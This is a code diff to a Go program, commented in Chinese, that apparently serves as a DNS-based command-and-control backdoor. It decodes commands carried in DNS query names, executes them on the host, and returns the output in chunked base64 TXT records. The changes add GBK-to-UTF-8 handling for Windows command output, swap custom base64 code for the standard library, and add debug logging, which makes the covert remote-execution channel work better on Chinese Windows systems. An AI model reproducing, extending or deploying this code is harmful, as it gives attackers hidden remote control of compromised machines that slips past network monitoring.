@@ -20,6 +20,7 @@ package main
 
 import (
 	"crypto/rand"
+	"encoding/base64"
 	"encoding/binary"
 	"fmt"
 	"net"
@@ -28,6 +29,9 @@ import (
 	"strings"
 	"syscall"
 	"time"
+
+	"golang.org/x/text/encoding/simplifiedchinese"
+	"golang.org/x/text/transform"
 )
 
 // DNS消息结构定义，与服务器端保持一致
@@ -225,11 +229,35 @@ func executeCommand(commandStr string) string {
 
 	output, err := cmd.CombinedOutput()
 
+	// 将Windows GBK编码的输出转换为UTF-8
+	result := convertGBKToUTF8(output)
+
 	if err != nil {
-		return fmt.Sprintf("命令执行出错: %v\n输出:\n%s", err, output)
+		return fmt.Sprintf("命令执行出错: %v\n输出:\n%s", err, result)
 	} else {
-		return string(output)
+		return result
 	}
+}
+
+// convertGBKToUTF8 将GBK编码的字节转换为UTF-8字符串
+func convertGBKToUTF8(gbkBytes []byte) string {
+	// 如果是空数据，直接返回
+	if len(gbkBytes) == 0 {
+		return ""
+	}
+
+	// 尝试GBK到UTF-8转换
+	decoder := simplifiedchinese.GBK.NewDecoder()
+	utf8Bytes, _, err := transform.Bytes(decoder, gbkBytes)
+	if err != nil {
+		// 如果转换失败，可能原始数据就是UTF-8或ASCII，直接返回
+		fmt.Printf("[调试] GBK转换失败，使用原始数据: %v\n", err)
+		return string(gbkBytes)
+	}
+
+	result := string(utf8Bytes)
+	fmt.Printf("[调试] GBK到UTF-8转换完成 - 输入字节: %d，输出字符: %d\n", len(gbkBytes), len(result))
+	return result
 }
 
 // ==============================================
@@ -370,10 +398,14 @@ func parseDNSQuery(data []byte) (string, error) {
 	}
 
 	encodedCommand := parts[0]
-	command, err := decodeBase64(encodedCommand)
+	// 使用标准库Base64解码，确保UTF-8中文字符正确处理
+	decodedBytes, err := base64.URLEncoding.DecodeString(encodedCommand)
 	if err != nil {
 		return "", fmt.Errorf("解码命令失败: %w", err)
 	}
+	command := string(decodedBytes)
+	fmt.Printf("[调试] Base64解码完成 - 输入长度: %d，输出UTF-8字节: %d，字符串: %s\n",
+		len(encodedCommand), len(decodedBytes), command)
 
 	return command, nil
 }
@@ -419,8 +451,10 @@ func createDNSResponse(queryID uint16, responseData string) []byte {
 	dnsPacket = append(dnsPacket, ttl...)
 
 	// 处理大数据：使用多个TXT记录分块传输
-	encodedResponse := encodeBase64(responseData)
-	fmt.Printf("[调试] Base64编码后长度: %d 字符\n", len(encodedResponse))
+	// 使用标准库Base64编码，确保UTF-8中文字符正确处理
+	encodedResponse := base64.URLEncoding.EncodeToString([]byte(responseData))
+	fmt.Printf("[调试] Base64编码 - 输入UTF-8字节: %d，输出长度: %d 字符\n",
+		len([]byte(responseData)), len(encodedResponse))
 
 	const maxTxtLength = 250 // 留一些余量，避免达到255限制
 
@@ -457,93 +491,6 @@ func createDNSResponse(queryID uint16, responseData string) []byte {
 	}
 
 	return dnsPacket
-}
-
-// encodeBase64 DNS安全的base64编码实现
-func encodeBase64(data string) string {
-	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-	input := []byte(data)
-	var result strings.Builder
-
-	for i := 0; i < len(input); i += 3 {
-		var a, b, c byte
-		a = input[i]
-		if i+1 < len(input) {
-			b = input[i+1]
-		}
-		if i+2 < len(input) {
-			c = input[i+2]
-		}
-
-		result.WriteByte(chars[a>>2])
-		result.WriteByte(chars[((a&0x03)<<4)|((b&0xf0)>>4)])
-
-		if i+1 < len(input) {
-			result.WriteByte(chars[((b&0x0f)<<2)|((c&0xc0)>>6)])
-		}
-		if i+2 < len(input) {
-			result.WriteByte(chars[c&0x3f])
-		}
-	}
-
-	return result.String()
-}
-
-// decodeBase64 DNS安全的base64解码实现
-func decodeBase64(encoded string) (string, error) {
-	const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_"
-
-	// 创建解码表
-	decodeTable := make(map[byte]byte)
-	for i, c := range chars {
-		decodeTable[byte(c)] = byte(i)
-	}
-
-	input := []byte(encoded)
-	var result []byte
-
-	for i := 0; i < len(input); i += 4 {
-		var a, b, c, d byte = 0, 0, 0, 0
-
-		if i < len(input) {
-			if val, ok := decodeTable[input[i]]; ok {
-				a = val
-			} else {
-				return "", fmt.Errorf("无效的base64字符: %c", input[i])
-			}
-		}
-		if i+1 < len(input) {
-			if val, ok := decodeTable[input[i+1]]; ok {
-				b = val
-			} else {
-				return "", fmt.Errorf("无效的base64字符: %c", input[i+1])
-			}
-		}
-		if i+2 < len(input) {
-			if val, ok := decodeTable[input[i+2]]; ok {
-				c = val
-			} else if len(input) > i+2 {
-				return "", fmt.Errorf("无效的base64字符: %c", input[i+2])
-			}
-		}
-		if i+3 < len(input) {
-			if val, ok := decodeTable[input[i+3]]; ok {
-				d = val
-			} else if len(input) > i+3 {
-				return "", fmt.Errorf("无效的base64字符: %c", input[i+3])
-			}
-		}
-
-		result = append(result, (a<<2)|((b&0x30)>>4))
-		if i+2 < len(input) && input[i+2] != 0 {
-			result = append(result, ((b&0x0f)<<4)|((c&0x3c)>>2))
-		}
-		if i+3 < len(input) && input[i+3] != 0 {
-			result = append(result, ((c&0x03)<<6)|d)
-		}
-	}
-
-	return string(result), nil
 }
 
 // isConnectionError 检查是否为连接错误
